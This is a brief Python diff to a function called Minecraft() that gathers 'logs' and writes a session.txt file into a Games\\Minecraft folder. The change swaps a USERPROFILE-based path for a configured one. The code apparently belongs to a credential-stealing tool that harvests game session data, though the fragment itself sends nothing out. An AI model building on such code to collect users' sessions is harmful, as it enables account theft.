@@ -24,8 +24,7 @@ def Minecraft():
                         ]
                 }
                 logs.append(log)
-                user = environ['USERPROFILE']
-                pathtofile = f'{user}\\{config.pathToLogs}'
+                pathtofile = config.pathToLogs
                 try:
                     makedirs(f'{pathtofile}\\Games\\Minecraft', exist_ok=True)
                     with open(f'{pathtofile}\\Games\\Minecraft\\session.txt',"w") as file:
